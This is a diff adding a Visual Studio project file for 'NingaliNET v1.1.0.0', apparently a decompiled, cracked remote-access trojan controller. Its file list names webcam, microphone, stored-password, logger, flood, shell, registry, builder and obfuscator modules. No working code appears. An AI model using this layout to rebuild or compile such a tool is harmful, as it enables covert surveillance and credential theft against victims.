@@ -1,0 +1,479 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{7EAE7E78-ED95-4CAB-B3B3-231B41BB5AA0}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>NINGALINET</RootNamespace>
+    <AssemblyName>NingaliNET v1.1.0.0</AssemblyName>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>NingaliNET v1.1.0.0.ico</ApplicationIcon>
+    <StartupObject>NINGALINET.My.MyApplication</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="Interop.NATUPNPLib">
+      <HintPath>..\..\NingaliNET v1.1.0.0-cracked\Interop.NATUPNPLib.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Xml" />
+    <Reference Include="Mono.Cecil">
+      <HintPath>..\..\NingaliNET v1.1.0.0-cracked\Mono.Cecil.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-{29DA315E-2694-4B5A-8B65-29382B84BE9A}.cs" />
+    <Compile Include="Bloom.cs" />
+    <Compile Include="ButtonBlue.cs" />
+    <Compile Include="ButtonGreen.cs" />
+    <Compile Include="CHButton.cs" />
+    <Compile Include="CHCombobox.cs" />
+    <Compile Include="CHGroupBox.cs" />
+    <Compile Include="CHProgressbar.cs" />
+    <Compile Include="CHSeparator.cs" />
+    <Compile Include="CHTextbox.cs" />
+    <Compile Include="CHTheme.cs" />
+    <Compile Include="Class0.cs" />
+    <Compile Include="Class1.cs" />
+    <Compile Include="Class2.cs" />
+    <Compile Include="Client.cs" />
+    <Compile Include="ControlAbout.Designer.cs">
+      <DependentUpon>ControlAbout.resx</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <Compile Include="ControlBuilder.Designer.cs">
+      <DependentUpon>ControlBuilder.resx</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <Compile Include="ControlDetector.Designer.cs">
+      <DependentUpon>ControlDetector.resx</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <Compile Include="ControlShatroom.Designer.cs">
+      <DependentUpon>ControlShatroom.resx</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <Compile Include="ControlToolBOX.Designer.cs">
+      <DependentUpon>ControlToolBOX.resx</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <Compile Include="ControNe.Designer.cs">
+      <DependentUpon>ControNe.resx</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <Compile Include="Draw.cs" />
+    <Compile Include="FDesktop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FDesktop.Designer.cs">
+      <DependentUpon>FDesktop.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FMcach.cs" />
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Form2.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form2.Designer.cs">
+      <DependentUpon>Form2.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmBuy.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmBuy.Designer.cs">
+      <DependentUpon>FrmBuy.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmCam.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmCam.Designer.cs">
+      <DependentUpon>FrmCam.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmChat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmChat.Designer.cs">
+      <DependentUpon>FrmChat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmClipboar.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmClipboar.Designer.cs">
+      <DependentUpon>FrmClipboar.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmConnections.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmConnections.Designer.cs">
+      <DependentUpon>FrmConnections.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmDwonload.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmDwonload.Designer.cs">
+      <DependentUpon>FrmDwonload.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmEditHost.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmEditHost.Designer.cs">
+      <DependentUpon>FrmEditHost.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmFilemanager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmFilemanager.Designer.cs">
+      <DependentUpon>FrmFilemanager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmFlood.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmFlood.Designer.cs">
+      <DependentUpon>FrmFlood.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmFun.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmFun.Designer.cs">
+      <DependentUpon>FrmFun.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmHelp.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmHelp.Designer.cs">
+      <DependentUpon>FrmHelp.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmInfoPlugin.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmInfoPlugin.Designer.cs">
+      <DependentUpon>FrmInfoPlugin.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmInformasi.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmInformasi.Designer.cs">
+      <DependentUpon>FrmInformasi.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmInstalled.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmInstalled.Designer.cs">
+      <DependentUpon>FrmInstalled.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmIPlockup.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmIPlockup.Designer.cs">
+      <DependentUpon>FrmIPlockup.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmLogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmLogger.Designer.cs">
+      <DependentUpon>FrmLogger.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMic.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmMic.Designer.cs">
+      <DependentUpon>FrmMic.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmNotification.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmNotification.Designer.cs">
+      <DependentUpon>FrmNotification.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmProcess.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmProcess.Designer.cs">
+      <DependentUpon>FrmProcess.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmRegEdit.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmRegEdit.Designer.cs">
+      <DependentUpon>FrmRegEdit.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmRegistry.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmRegistry.Designer.cs">
+      <DependentUpon>FrmRegistry.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmScript.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmScript.Designer.cs">
+      <DependentUpon>FrmScript.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmServices.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmServices.Designer.cs">
+      <DependentUpon>FrmServices.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmShell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmShell.Designer.cs">
+      <DependentUpon>FrmShell.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmStartUp.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmStartUp.Designer.cs">
+      <DependentUpon>FrmStartUp.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmStoredPassword.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmStoredPassword.Designer.cs">
+      <DependentUpon>FrmStoredPassword.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmUpload.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmUpload.Designer.cs">
+      <DependentUpon>FrmUpload.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmURL.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmURL.Designer.cs">
+      <DependentUpon>FrmURL.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmWinList.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmWinList.Designer.cs">
+      <DependentUpon>FrmWinList.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Fungsi.cs" />
+    <Compile Include="Getcountry.cs" />
+    <Compile Include="GroupDropBox.cs" />
+    <Compile Include="GroupPanelBox.cs" />
+    <Compile Include="Gunakanicon.cs" />
+    <Compile Include="HuraControlBox.cs" />
+    <Compile Include="ima.cs" />
+    <Compile Include="Logsaktifitas.cs" />
+    <Compile Include="LV.cs" />
+    <Compile Include="LVII.cs" />
+    <Compile Include="MouseState.cs" />
+    <Compile Include="My\MyApplication.cs" />
+    <Compile Include="My\MyComputer.cs" />
+    <Compile Include="My\MyProject.cs" />
+    <Compile Include="My\MySettings.cs" />
+    <Compile Include="My\MySettings.Designer.cs">
+      <DependentUpon>MySettings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="My\MySettingsProperty.cs" />
+    <Compile Include="My\Resources\NINGALINET.Resources.Designer.cs">
+      <DependentUpon>NINGALINET.Resources.resx</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <Compile Include="Obfoscator.cs" />
+    <Compile Include="PanelBox.cs" />
+    <Compile Include="plg.cs" />
+    <Compile Include="port1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="port1.Designer.cs">
+      <DependentUpon>port1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Pp1.cs" />
+    <Compile Include="PrecisionTimer.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="SocketServer.cs" />
+    <Compile Include="Theme.cs" />
+    <Compile Include="ThemeContainer154.cs" />
+    <Compile Include="ThemeContainerControl.cs" />
+    <Compile Include="ThemeControl.cs" />
+    <Compile Include="ThemeControl154.cs" />
+    <Compile Include="ThemeShare.cs" />
+    <Compile Include="TxtBox.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="aR3nbf8dQp2feLmk31\lSfgApatkdxsVcGcrktoFd.resx" />
+    <EmbeddedResource Include="aR3nbf8dQp2feLmk31\SplashForm.resx" />
+    <EmbeddedResource Include="ControlAbout.resx">
+      <Generator>PublicResXFileCodeGenerator</Generator>
+      <LastGenOutput>ControlAbout.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlBuilder.resx">
+      <Generator>PublicResXFileCodeGenerator</Generator>
+      <LastGenOutput>ControlBuilder.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlDetector.resx">
+      <Generator>PublicResXFileCodeGenerator</Generator>
+      <LastGenOutput>ControlDetector.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlShatroom.resx">
+      <Generator>PublicResXFileCodeGenerator</Generator>
+      <LastGenOutput>ControlShatroom.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlToolBOX.resx">
+      <Generator>PublicResXFileCodeGenerator</Generator>
+      <LastGenOutput>ControlToolBOX.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControNe.resx">
+      <Generator>PublicResXFileCodeGenerator</Generator>
+      <LastGenOutput>ControNe.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FDesktop.resx">
+      <DependentUpon>FDesktop.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form2.resx">
+      <DependentUpon>Form2.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmBuy.resx">
+      <DependentUpon>FrmBuy.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmCam.resx">
+      <DependentUpon>FrmCam.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmChat.resx">
+      <DependentUpon>FrmChat.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmClipboar.resx">
+      <DependentUpon>FrmClipboar.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmConnections.resx">
+      <DependentUpon>FrmConnections.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmDwonload.resx">
+      <DependentUpon>FrmDwonload.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmEditHost.resx">
+      <DependentUpon>FrmEditHost.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmFilemanager.resx">
+      <DependentUpon>FrmFilemanager.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmFlood.resx">
+      <DependentUpon>FrmFlood.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmFun.resx">
+      <DependentUpon>FrmFun.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmHelp.resx">
+      <DependentUpon>FrmHelp.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmInfoPlugin.resx">
+      <DependentUpon>FrmInfoPlugin.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmInformasi.resx">
+      <DependentUpon>FrmInformasi.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmInstalled.resx">
+      <DependentUpon>FrmInstalled.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmIPlockup.resx">
+      <DependentUpon>FrmIPlockup.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmLogger.resx">
+      <DependentUpon>FrmLogger.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmMic.resx">
+      <DependentUpon>FrmMic.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmNotification.resx">
+      <DependentUpon>FrmNotification.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmProcess.resx">
+      <DependentUpon>FrmProcess.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmRegEdit.resx">
+      <DependentUpon>FrmRegEdit.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmRegistry.resx">
+      <DependentUpon>FrmRegistry.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmScript.resx">
+      <DependentUpon>FrmScript.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmServices.resx">
+      <DependentUpon>FrmServices.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmShell.resx">
+      <DependentUpon>FrmShell.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmStartUp.resx">
+      <DependentUpon>FrmStartUp.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmStoredPassword.resx">
+      <DependentUpon>FrmStoredPassword.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmUpload.resx">
+      <DependentUpon>FrmUpload.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmURL.resx">
+      <DependentUpon>FrmURL.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FrmWinList.resx">
+      <DependentUpon>FrmWinList.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My\Resources\NINGALINET.Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>NINGALINET.Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="NingaliNET v1\1\0\0\g.resx" />
+    <EmbeddedResource Include="port1.resx">
+      <DependentUpon>port1.cs</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="My\MySettings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>MySettings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
